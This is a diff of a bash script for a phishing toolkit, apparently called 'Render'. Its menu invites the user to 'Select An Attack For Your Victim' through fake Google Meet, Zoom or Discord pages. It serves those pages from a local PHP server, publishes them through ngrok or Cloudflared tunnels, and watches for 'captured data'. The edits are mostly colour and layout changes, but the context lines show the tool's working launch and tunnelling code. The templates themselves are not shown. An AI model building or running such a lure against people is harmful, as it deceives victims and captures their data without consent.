@@ -59,7 +59,7 @@ banner() {
   printf "\e[1;96m                     _\e[0m\n"
   printf "\e[1;96m                    | |\e[0m\n"
   printf "\e[1;96m  _ __ ___ _ __   __| | ___ _ __   ___ __ _ _ __ ___\e[0m\n"
-  printf "\e[1;96m |  __/ _ \\  _ \\ / _  |/ _ \\  __| / __/ _  |  _   _ \\\e[0m\n"
+  printf "\e[1;96m |  __/ _ \\  _ \\ / _  |/ _ \\  __| / __/ _  |  _   _ \\  \e[0m\n"
   printf "\e[1;96m | | |  __/ | | | (_| |  __/ |   | (_| (_| | | | | | |\e[0m\n"
   printf "\e[1;96m |_|  \\___|_| |_|\\__,_|\\___|_|    \\___\\__,_|_| |_| |_|\e[0m\n"
   printf "\e[1;91m     Tool created by Render\e[0m\e[1;96m             Version: \e[1;91m%s\e[0m\n" "${__version__}"
@@ -71,9 +71,9 @@ banner() {
 ## Small Banner
 banner_small() {
   clear
-  printf "\e[1;94m░░█▀▄░█▀▀░█▀█░█▀▄░█▀▀░█▀▄░█▀▀░█▀█░█▄█\e[0m\n"
-  printf "\e[1;94m░░█▀▄░█▀▀░█░█░█░█░█▀▀░█▀▄░█░░░█▀█░█░█\e[0m\n"
-  printf "\e[1;94m░░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░▀▀▀░▀░▀░▀░▀\e[0m\n"
+  printf "\e[1;94m ░░█▀▄░█▀▀░█▀█░█▀▄░█▀▀░█▀▄░█▀▀░█▀█░█▄█ \e[0m\n"
+  printf "\e[1;94m ░░█▀▄░█▀▀░█░█░█░█░█▀▀░█▀▄░█░░░█▀█░█░█ \e[0m\n"
+  printf "\e[1;94m ░░▀░▀░▀▀▀░▀░▀░▀▀░░▀▀▀░▀░▀░▀▀▀░▀░▀░▀░▀ \e[0m\n"
   printf "\e[1;91m                   Version %s\e[0m\n" "${__version__}"
   printf "\n"
 }
@@ -360,7 +360,7 @@ if [[ "$windows_mode" == true ]]; then
         echo './cloudflared.exe "$@"' >> cloudflared
         chmod +x cloudflared
     else
-        printf "\e[1;93m[!] Download error... \e[0m\n"
+        printf "${RED}[!] Download error... \e[0m\n"
         exit 1
     fi
 else
@@ -380,7 +380,7 @@ else
             chmod +x cloudflared
             rm cloudflared.tgz
         else
-            printf "\e[1;93m[!] Download error... \e[0m\n"
+            printf "${RED}[!] Download error... \e[0m\n"
             exit 1
         fi
     # Linux and other Unix-like systems
@@ -505,7 +505,7 @@ else
             chmod +x ngrok
             rm -rf ngrok.zip
         else
-            printf "\e[1;93m[!] Download error... \e[0m\n"
+            printf "${RED}[!] Download error... \e[0m\n"
             exit 1
         fi
     # Linux and other Unix-like systems
@@ -538,7 +538,7 @@ else
             chmod +x ngrok
             rm -rf ngrok.zip
         else
-            printf "\e[1;93m[!] Download error... \e[0m\n"
+            printf "${RED}[!] Download error... \e[0m\n"
             exit 1
         fi
     fi
@@ -560,10 +560,10 @@ if [[ "$windows_mode" == true ]]; then
         read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
         ./ngrok.exe authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+    printf "${LIGHT_GREEN}[${WHITE}>${LIGHT_GREEN}] Starting php server...\n"
     php -S "$HOST:$PORT" > /dev/null 2>&1 &
     sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+    printf "${LIGHT_GREEN}[${WHITE}>${LIGHT_GREEN}] Starting ngrok server...\n"
     ./ngrok.exe http "$PORT" > /dev/null 2>&1 &
 else
     if [[ -e ~/.ngrok2/ngrok.yml ]]; then
@@ -579,10 +579,10 @@ else
         read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter your valid ngrok authtoken: \e[0m' ngrok_auth
         ./ngrok authtoken $ngrok_auth >  /dev/null 2>&1 &
     fi
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
+    printf "${LIGHT_GREEN}[${WHITE}>${LIGHT_GREEN}] Starting php server...\n"
     php -S "$HOST:$PORT" > /dev/null 2>&1 &
     sleep 2
-    printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
+    printf "${LIGHT_GREEN}[${WHITE}>${LIGHT_GREEN}] Starting ngrok server...\n"
     ./ngrok http "$PORT" > /dev/null 2>&1 &
 fi
 
@@ -590,12 +590,12 @@ sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[^/"]*\.ngrok-free.app')
 if [[ -z "$link" ]]; then
-printf "\e[1;31m[!] Direct link is not generating, check following possible reason  \e[0m\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok authtoken is not valid\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m If you are using android, turn hotspot on\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Ngrok is already running, run this command killall ngrok\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Check your internet connection\n"
-printf "\e[1;92m[\e[0m*\e[1;92m] \e[0m\e[1;93m Try running ngrok manually: ./ngrok http 3333\n"
+printf "${RED} [!] Direct link is not generating, check following possible reason  \e[0m\n"
+printf "${RED} [-] Ngrok authtoken is not valid\n"
+printf "${RED} [-] If you are using android, turn hotspot on\n"
+printf "${RED} [-] Ngrok is already running, run this command killall ngrok\n"
+printf "${RED} [-] Check your internet connection\n"
+printf "${RED} [-] Try running ngrok manually: ./ngrok http 3333\n"
 exit 1
 else
 printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
@@ -636,8 +636,7 @@ about() {
 
   printf "${RED}Warning:\n"
   printf "${BLACK} ${REDBG}This Tool is made for educational purpose only!${RESETBG}\n"
-  printf "${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!
-!${RESETBG}\n\n"
+  printf "${BLACK} ${REDBG}Author will not be responsible for any misuse of this toolkit!${RESETBG}\n\n"
 
   printf "${ORANGE}Contributors:\n"
   printf "${BRIGHT_GREEN} Aditya Shakya, techchipnet, Kr3sZ, Prateek\n\n"
@@ -663,12 +662,12 @@ about() {
 tunnel_menu() {
   { clear; banner_small; }
 
-  printf "${CYAN} 0. Main Menu\n"
-  printf "${CYAN} 1. Localhost\n"
-  printf "${CYAN} 2. Ngrok.io\n"
-  printf "${CYAN} 3. Cloudflared\n\n"
+  printf "${CYAN} 00. Main Menu\n"
+  printf "${CYAN} 01. Localhost\n"
+  printf "${CYAN} 02. Ngrok.io\n"
+  printf "${CYAN} 03. Cloudflared\n\n"
 
-  read -p "${MAGENTA} Select a port forwarding service or return to main menu: "
+  read -p "${MAGENTA} Select a port forwarding service or return to main menu:\n"
 
   case $REPLY in
     0 | 00)
@@ -676,10 +675,10 @@ tunnel_menu() {
       { sleep 1; main_menu; };;
     1 | 01)
       # Localhost option: Directly run PHP server
-      printf "\e[1;92m[\e[0m+\e[1;92m] Starting PHP server on %s:%s...\n" "$HOST" "$PORT"
+      printf "${LIGHT_GREEN}[${WHITE}>${LIGHT_GREEN}] Starting PHP server on %s:%s...\n" "$HOST" "$PORT"
       php -S "$HOST:$PORT" > /dev/null 2>&1 &
       sleep 5  # Give the server some time to start
-      echo -e "\e[1;92m[\e[0m*\e[1;92m] Web server running. Open your browser to http://$HOST:$PORT\e[0m"
+      echo -e "${LIGHT_GREEN}[${WHITE}+${LIGHT_GREEN}] Web server running. Open your browser to http://$HOST:$PORT\e[0m"
       checkfound # Start checking for captured data
       ;;
     2 | 02)
@@ -698,24 +697,24 @@ main_menu() {
 
   printf "${RED}Select An Attack For Your Victim:\n\n"
 
-  printf "${WHITE}| ${BRIGHT_BLACK}01. ${BRIGHT_CYAN}Google Meet\n"
-  printf "${WHITE}| ${BRIGHT_BLACK}02. ${BRIGHT_CYAN}Zoom Call\n"
-  printf "${WHITE}| ${BRIGHT_BLACK}03. ${BRIGHT_CYAN}Discord Call\n\n"
+  printf "${WHITE}| ${BRIGHT_BLACK}01. ${BRIGHT_CYAN}Google Meet   ${WHITE}| \n"
+  printf "${WHITE}| ${BRIGHT_BLACK}02. ${BRIGHT_CYAN}Zoom Call     ${WHITE}| \n"
+  printf "${WHITE}| ${BRIGHT_BLACK}03. ${BRIGHT_CYAN}Discord Call  ${WHITE}| \n\n"
 
-  printf "${WHITE}| ${BRIGHT_BLACK}99. ${BRIGHT_CYAN}About\n"
-  printf "${WHITE}| ${BRIGHT_BLACK}00. ${BRIGHT_CYAN}Exit\n\n"
+  printf "${WHITE}| ${BRIGHT_BLACK}99. ${BRIGHT_CYAN}About         ${WHITE}| \n"
+  printf "${WHITE}| ${BRIGHT_BLACK}00. ${BRIGHT_CYAN}Exit          ${WHITE}| \n\n"
 
   read -p " ${BRIGHT_GREEN}Select an option: "
 
   case $REPLY in
     1 | 01)
-      printf "\n\e[1;92m[+] Starting Google Meet Template...\e[0m\n"
+      printf "\n${LIGHT_GREEN}[${WHITE}>${LIGHT_GREEN}] Starting Google Meet Template...\e[0m\n"
       tunnel_menu;;
     2 | 02)
-      printf "\n\e[1;92m[+] Starting Zoom Template...\e[0m\n"
+      printf "\n${LIGHT_GREEN}[${WHITE}>${LIGHT_GREEN}] Starting Zoom Template...\e[0m\n"
       tunnel_menu;;
     3 | 03)
-      printf "\n\e[1;92m[+] Starting Discord Template...\e[0m\n"
+      printf "\n${LIGHT_GREEN}[${WHITE}>${LIGHT_GREEN}] Starting Discord Template...\e[0m\n"
       tunnel_menu;;
     99)
       about;;
